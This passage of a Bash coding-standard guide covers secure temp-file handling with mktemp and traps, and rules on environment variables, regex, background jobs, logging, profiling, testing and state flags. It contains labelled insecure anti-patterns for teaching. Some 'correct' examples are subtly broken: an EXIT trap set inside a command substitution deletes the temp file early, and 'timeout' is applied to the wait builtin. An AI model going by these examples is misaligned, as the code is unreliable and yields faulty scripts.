# Script Invocation
# ============================================================================

main "$@"

#fin
```

**Temp file security considerations:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ CORRECT - Secure temp file handling
secure_temp_file() {
  local -- temp_file

  # Create with secure permissions (0600)
  temp_file=$(mktemp) || die 1 'Failed to create temp file'

  # Verify it's a regular file
  if [[ ! -f "$temp_file" ]]; then
    die 1 "Temp file is not a regular file: $temp_file"
  fi

  # Verify ownership (should be current user)
  local -- owner
  owner=$(stat -c %U "$temp_file" 2>/dev/null || stat -f %Su "$temp_file" 2>/dev/null)
  if [[ "$owner" != "$USER" ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has wrong owner: $owner (expected: $USER)"
  fi

  # Verify permissions (0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created secure temp file: $temp_file"
  info "  Owner: $owner"
  info "  Permissions: $perms"

  echo "$temp_file"
}

# ✓ CORRECT - Secure temp directory handling
secure_temp_dir() {
  local -- temp_dir

  # Create with secure permissions (0700)
  temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'

  # Verify it's a directory
  if [[ ! -d "$temp_dir" ]]; then
    die 1 "Temp path is not a directory: $temp_dir"
  fi

  # Verify permissions (0700)
  local -- perms
  perms=$(stat -c %a "$temp_dir" 2>/dev/null || stat -f %Lp "$temp_dir" 2>/dev/null)
  if [[ "$perms" != '700' ]]; then
    rm -rf "$temp_dir"
    die 1 "Temp directory has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  info "Created secure temp directory: $temp_dir (permissions: $perms)"

  echo "$temp_dir"
}

main() {
  local -- temp_file temp_dir

  temp_file=$(secure_temp_file)
  temp_dir=$(secure_temp_dir)

  # Use temp resources
  echo 'Sensitive data' > "$temp_file"
  echo 'More data' > "$temp_dir/file.txt"
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - Hard-coded temp file path
temp_file="/tmp/myapp_temp.txt"
echo 'data' > "$temp_file"
# Problems:
# - Not unique (collisions with other instances)
# - Predictable name (security risk)
# - No automatic cleanup

# ✓ CORRECT - Use mktemp
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
echo 'data' > "$temp_file"

# ✗ WRONG - Using PID in filename
temp_file="/tmp/myapp_$$.txt"
echo 'data' > "$temp_file"
# Problems:
# - Still predictable
# - Race condition between check and create
# - No automatic cleanup

# ✓ CORRECT - Use mktemp with template
temp_file=$(mktemp /tmp/myapp.XXXXXX) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - No cleanup trap
temp_file=$(mktemp)
echo 'data' > "$temp_file"
# Script exits, temp file remains!

# ✓ CORRECT - Always set trap
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Cleanup in script body
temp_file=$(mktemp)
echo 'data' > "$temp_file"
rm -f "$temp_file"
# If script fails before rm, file remains!

# ✓ CORRECT - Cleanup in trap
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
echo 'data' > "$temp_file"
# Cleanup happens even if script fails

# ✗ WRONG - Creating temp file manually
temp_file="/tmp/myapp_$(date +%s).txt"
touch "$temp_file"
chmod 600 "$temp_file"
# Problems:
# - Not atomic
# - Race conditions
# - Reinventing mktemp badly

# ✓ CORRECT - Use mktemp
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Insecure permissions
temp_file=$(mktemp)
chmod 666 "$temp_file"  # World writable!
echo 'sensitive data' > "$temp_file"

# ✓ CORRECT - Keep default secure permissions
temp_file=$(mktemp) || die 1 'Failed to create temp file'
# Permissions are already 0600 (user read/write only)
echo 'sensitive data' > "$temp_file"

# ✗ WRONG - Not checking mktemp success
temp_file=$(mktemp)
echo 'data' > "$temp_file"  # May fail if mktemp failed!

# ✓ CORRECT - Check mktemp success
temp_file=$(mktemp) || die 1 'Failed to create temp file'
echo 'data' > "$temp_file"

# ✗ WRONG - Multiple traps overwrite each other
temp1=$(mktemp)
trap 'rm -f "$temp1"' EXIT

temp2=$(mktemp)
trap 'rm -f "$temp2"' EXIT  # Overwrites previous trap!
# temp1 won't be cleaned up!

# ✓ CORRECT - Single trap for all cleanup
temp1=$(mktemp) || die 1 'Failed to create temp file'
temp2=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp1" "$temp2"' EXIT

# ✓ BETTER - Cleanup function
declare -a TEMP_FILES=()
cleanup() {
  local -- file
  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file"
  done
}
trap cleanup EXIT

temp1=$(mktemp)
TEMP_FILES+=("$temp1")

temp2=$(mktemp)
TEMP_FILES+=("$temp2")

# ✗ WRONG - Using /tmp directly in script directory
temp_file="$SCRIPT_DIR/temp.txt"
# Problem: pollutes script directory

# ✓ CORRECT - Use system temp directory
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Removing temp directory without -r
temp_dir=$(mktemp -d)
trap 'rm "$temp_dir"' EXIT  # Fails if directory not empty!

# ✓ CORRECT - Use -rf for directories
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
```

**Edge cases:**

**1. Cleanup on different exit conditions:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -- TEMP_FILE=''

cleanup() {
  local -i exit_code=$?

  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    if ((exit_code == 0)); then
      info 'Cleaning up (success)'
    else
      warn "Cleaning up (error: exit code $exit_code)"
    fi
    rm -f "$TEMP_FILE"
  fi

  return "$exit_code"
}

trap cleanup EXIT

main() {
  TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
  readonly -- TEMP_FILE

  info "Using temp file: $TEMP_FILE"

  # Do work...

  # Cleanup happens automatically
  return 0
}

main "$@"

#fin
```

**2. Preserving temp files for debugging:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i KEEP_TEMP=0
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=$?
  local -- file

  if ((KEEP_TEMP)); then
    if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
      info 'Keeping temp files for debugging:'
      for file in "${TEMP_FILES[@]}"; do
        info "  $file"
      done
    fi
  else
    for file in "${TEMP_FILES[@]}"; do
      [[ -f "$file" ]] && rm -f "$file"
      [[ -d "$file" ]] && rm -rf "$file"
    done
  fi

  return "$exit_code"
}

trap cleanup EXIT

main() {
  # Parse --keep-temp option
  while (($#)); do
    case $1 in
      --keep-temp) KEEP_TEMP=1 ;;
      *) break ;;
    esac
    shift
  done

  readonly -- KEEP_TEMP

  local -- temp_file
  temp_file=$(mktemp)
  TEMP_FILES+=("$temp_file")

  echo 'Debug data' > "$temp_file"

  # If --keep-temp specified, files preserved
}

main "$@"

#fin
```

**3. Temp files in specific directory:**

```bash
# Create temp file in specific directory
temp_file=$(mktemp "$SCRIPT_DIR/temp.XXXXXX") ||
  die 1 'Failed to create temp file in script directory'

trap 'rm -f "$temp_file"' EXIT

# Create temp directory in specific location
temp_dir=$(mktemp -d "$HOME/work/temp.XXXXXX") ||
  die 1 'Failed to create temp directory'

trap 'rm -rf "$temp_dir"' EXIT
```

**4. Multiple trap handlers:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -a TEMP_FILES=()

# Cleanup temp files
cleanup_temp() {
  local -- file
  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file"
    [[ -d "$file" ]] && rm -rf "$file"
  done
}

# Other cleanup
cleanup_other() {
  # Other cleanup tasks
  info 'Performing other cleanup'
}

# Combined cleanup
cleanup() {
  local -i exit_code=$?

  cleanup_temp
  cleanup_other

  return "$exit_code"
}

trap cleanup EXIT

main() {
  local -- temp_file
  temp_file=$(mktemp)
  TEMP_FILES+=("$temp_file")

  # Do work...
}

main "$@"

#fin
```

**5. Handling signals:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -- TEMP_FILE=''

cleanup() {
  local -i exit_code=$?

  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    rm -f "$TEMP_FILE"
  fi

  return "$exit_code"
}

# Cleanup on normal exit and signals
trap cleanup EXIT SIGINT SIGTERM

main() {
  TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
  readonly -- TEMP_FILE

  info "Press Ctrl-C to test signal handling"

  # Simulate long-running operation
  local -i i
  for ((i=1; i<=60; i+=1)); do
    echo "Working... $i"
    sleep 1
  done

  # Cleanup happens even if interrupted
}

main "$@"

#fin
```

**Summary:**

- **Always use mktemp** - never hard-code temp file paths
- **Use trap for cleanup** - ensure cleanup happens even on failure
- **Register all temp resources** - in array or cleanup function
- **EXIT trap is mandatory** - automatic cleanup when script ends
- **Check mktemp success** - `|| die` to handle creation failure
- **Default permissions are secure** - mktemp creates 0600 files, 0700 directories
- **Template support** - use custom templates for recognizable temp files
- **Keep variables readonly** - prevent accidental modification
- **Cleanup function pattern** - for multiple temp files/directories
- **--keep-temp option** - useful for debugging
- **Signal handling** - trap SIGINT SIGTERM for interruption cleanup
- **Verify security** - check permissions and ownership if handling sensitive data

**Key principle:** Temporary files are a common source of security vulnerabilities and resource leaks. Always use mktemp for creation (never hard-code paths), always use trap EXIT for cleanup (never rely on manual cleanup), and always verify that cleanup actually occurs. The combination of mktemp + trap EXIT is the gold standard for temp file handling in Bash - it's atomic, secure, and guarantees cleanup even when scripts fail or are interrupted.


---


**Rule: BCS1404**

### Environment Variable Best Practices

Proper handling of environment variables.

\`\`\`bash
# Required environment validation (script exits if not set)
: "${REQUIRED_VAR:?Environment variable REQUIRED_VAR not set}"
: "${DATABASE_URL:?DATABASE_URL must be set}"

# Optional with defaults
: "${OPTIONAL_VAR:=default_value}"
: "${LOG_LEVEL:=INFO}"

# Export with validation
export DATABASE_URL="${DATABASE_URL:-localhost:5432}"
export API_KEY="${API_KEY:?API_KEY environment variable required}"

# Check multiple required variables
declare -a REQUIRED=(DATABASE_URL API_KEY SECRET_TOKEN)
#...
check_required_env() {
  local -- var
  for var in "${REQUIRED[@]}"; do
    [[ -n "${!var:-}" ]] || {
      error "Required environment variable '$var' not set"
      return 1
    }
  done
  return 0
}
\`\`\`


---


**Rule: BCS1405**

### Regular Expression Guidelines

Best practices for using regular expressions in Bash.

\`\`\`bash
# Use POSIX character classes for portability
[[ "$var" =~ ^[[:alnum:]]+$ ]]      # Alphanumeric only
[[ "$var" =~ [[:space:]] ]]         # Contains whitespace
[[ "$var" =~ ^[[:digit:]]+$ ]]      # Digits only
[[ "$var" =~ ^[[:xdigit:]]+$ ]]     # Hexadecimal

# Store complex patterns in readonly variables
readonly -- EMAIL_REGEX='^[[:alnum:]._%+-]+@[[:alnum:].-]+\.[[:alpha:]]{2,}$'
readonly -- IPV4_REGEX='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
readonly -- UUID_REGEX='^[[:xdigit:]]{8}-[[:xdigit:]]{4}-[[:xdigit:]]{4}-[[:xdigit:]]{4}-[[:xdigit:]]{12}$'

# Usage
[[ "$email" =~ $EMAIL_REGEX ]] || die 1 'Invalid email format'

# Capture groups
if [[ "$version" =~ ^v?([0-9]+)\.([0-9]+)\.([0-9]+)$ ]]; then
  major="${BASH_REMATCH[1]}"
  minor="${BASH_REMATCH[2]}"
  patch="${BASH_REMATCH[3]}"
fi
\`\`\`


---


**Rule: BCS1406**

### Background Job Management

Managing background processes and jobs.

\`\`\`bash
# Start background job and track PID
long_running_command &
PID=$!

# Check if process is still running
if kill -0 "$PID" 2>/dev/null; then
  info "Process $PID is still running"
fi

# Wait with timeout
if timeout 10 wait "$PID"; then
  success 'Process completed successfully'
else
  warn 'Process timed out or failed'
  kill "$PID" 2>/dev/null || true
fi

# Multiple background jobs
declare -a PIDS=()
for file in *.txt; do
  process_file "$file" &
  PIDS+=($!)
done

# Wait for all background jobs
for pid in "${PIDS[@]}"; do
  wait "$pid"
done

# Job control with error handling
run_with_timeout() {
  local -i timeout="$1"; shift
  local -- command="$*"

  timeout "$timeout" bash -c "$command" &
  local -i pid=$!

  if wait "$pid"; then
    return 0
  else
    local -i exit_code=$?
    if ((exit_code == 124)); then
      error "Command timed out after ${timeout}s"
    fi
    return "$exit_code"
  fi
}
\`\`\`


---


**Rule: BCS1407**

### Logging Best Practices

Structured logging for production scripts (simplified pattern).

\`\`\`bash
# Simple file logging
readonly LOG_FILE="${LOG_FILE:-/var/log/${SCRIPT_NAME}.log}"
readonly LOG_LEVEL="${LOG_LEVEL:-INFO}"

# Ensure log directory exists
[[ -d "${LOG_FILE%/*}" ]] || mkdir -p "${LOG_FILE%/*}"

# Structured logging function
log() {
  local -- level="$1"
  local -- message="${*:2}"

  # Format: ISO8601 timestamp, script name, level, message
  printf '[%s] [%s] [%-5s] %s\n' \
    "$(date -Ins)" \
    "$SCRIPT_NAME" \
    "$level" \
    "$message" >> "$LOG_FILE"
}

# Convenience functions
log_debug() { log DEBUG "$@"; }
log_info()  { log INFO "$@"; }
log_warn()  { log WARN "$@"; }
log_error() { log ERROR "$@"; }
\`\`\`


---


**Rule: BCS1408**

### Performance Profiling

Simple performance measurement patterns.

\`\`\`bash
# Using SECONDS builtin
profile_operation() {
  local -- operation="$1"
  SECONDS=0

  # Run operation
  eval "$operation"

  info "Operation completed in ${SECONDS}s"
}

# High-precision timing with EPOCHREALTIME
timer() {
  local -- start end runtime
  start=$EPOCHREALTIME

  "$@"

  end=$EPOCHREALTIME
  runtime=$(awk "BEGIN {print $end - $start}")
  info "Execution time: ${runtime}s"
}
\`\`\`


---


**Rule: BCS1409**

### Testing Support Patterns

Patterns for making scripts testable.

\`\`\`bash
# Dependency injection for testing
declare -f FIND_CMD >/dev/null || FIND_CMD() { find "$@"; }
declare -f DATE_CMD >/dev/null || DATE_CMD() { date "$@"; }
declare -f CURL_CMD >/dev/null || CURL_CMD() { curl "$@"; }

# In production
find_files() {
  FIND_CMD "$@"
}

# In tests, override:
FIND_CMD() { echo 'mocked_file1.txt mocked_file2.txt'; }

# Test mode flag
declare -i TEST_MODE="${TEST_MODE:-0}"

# Conditional behavior for testing
if ((TEST_MODE)); then
  # Use test data directory
  DATA_DIR='./test_data'
  # Disable destructive operations
  RM_CMD() { echo "TEST: Would remove $*"; }
else
  DATA_DIR='/var/lib/app'
  RM_CMD() { rm "$@"; }
fi

# Assert function for tests
assert() {
  local -- expected="$1"
  local -- actual="$2"
  local -- message="${3:-Assertion failed}"

  if [[ "$expected" != "$actual" ]]; then
    >&2 echo "ASSERT FAIL: $message"
    >&2 echo "  Expected: '$expected'"
    >&2 echo "  Actual:   '$actual'"
    return 1
  fi
  return 0
}

# Test runner pattern
run_tests() {
  local -i passed=0 failed=0
  local -- test_func

  # Find all functions starting with test_
  for test_func in $(declare -F | awk '$3 ~ /^test_/ {print $3}'); do
    if "$test_func"; then
      passed+=1
      echo "✓ $test_func"
    else
      failed+=1
      echo "✗ $test_func"
    fi
  done

  echo "Tests: $passed passed, $failed failed"
  ((failed == 0))
}
\`\`\`


---


**Rule: BCS1410**

### Progressive State Management

Manage script state by modifying boolean flags based on runtime conditions, separating decision logic from execution.

\`\`\`bash
# Initial flag declarations
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# Parse command-line arguments
main() {
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
    esac
    shift
  done

  # Progressive state management: adjust flags based on runtime conditions

  # If user explicitly requested to skip, disable installation
  if ((SKIP_BUILTIN)); then
    INSTALL_BUILTIN=0
  fi

  # Check if prerequisites are met, adjust flags accordingly
  if ! check_builtin_support; then
    # If user explicitly requested builtins, try to install dependencies
    if ((BUILTIN_REQUESTED)); then
      warn 'bash-builtins package not found, attempting to install...'
      install_bash_builtins || {
        error 'Failed to install bash-builtins package'
        INSTALL_BUILTIN=0  # Disable builtin installation
      }
    else
      # User didn't explicitly request, just skip
      info 'bash-builtins not found, skipping builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Build phase: disable on failure
  if ((INSTALL_BUILTIN)); then
    if ! build_builtin; then
      error 'Builtin build failed, disabling builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Execution phase: actions based on final flag state
  install_standalone
  ((INSTALL_BUILTIN)) && install_builtin  # Only runs if still enabled

  show_completion_message
}
\`\`\`

**Pattern structure:**
1. Declare all boolean flags at the top with initial values
2. Parse command-line arguments, setting flags based on user input
3. Progressively adjust flags based on runtime conditions:
   - Dependency checks (disable if prerequisites missing)
   - Build/operation failures (disable dependent features)
   - User preferences override system defaults
4. Execute actions based on final flag state

**Real-world example - conditional builtin installation:**
\`\`\`bash
# Initial state (defaults)
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# State progression through script lifecycle:

# 1. User input (--builtin flag)
INSTALL_BUILTIN=1
BUILTIN_REQUESTED=1

# 2. Override check (--no-builtin takes precedence)
((SKIP_BUILTIN)) && INSTALL_BUILTIN=0

# 3. Dependency check (no bash-builtins package)
if ! check_builtin_support; then
  if ((BUILTIN_REQUESTED)); then
    # Try to install, disable on failure
    install_bash_builtins || INSTALL_BUILTIN=0
  else
    # User didn't ask, just disable
    INSTALL_BUILTIN=0
  fi
fi

# 4. Build check (compilation failed)
((INSTALL_BUILTIN)) && ! build_builtin && INSTALL_BUILTIN=0

# 5. Final execution (only runs if INSTALL_BUILTIN=1)
((INSTALL_BUILTIN)) && install_builtin
\`\`\`

**Benefits:**
- Clean separation between decision logic and action
- Easy to trace how flags change throughout execution
- Fail-safe behavior (disable features when prerequisites fail)
- User intent preserved (\`BUILTIN_REQUESTED\` tracks original request)
- Idempotent (same input → same state → same output)

**Guidelines:**
- Group related flags together (e.g., \`INSTALL_*\`, \`SKIP_*\`)
- Use separate flags for user intent vs. runtime state
- Document state transitions with comments
- Apply state changes in logical order (parse → validate → execute)
- Never modify flags during execution phase (only in setup/validation)

**Rationale:** This pattern allows scripts to adapt to runtime conditions while maintaining clarity about why decisions were made. It's especially useful for installation scripts where features may need to be disabled based on system capabilities or build failures.
#fin
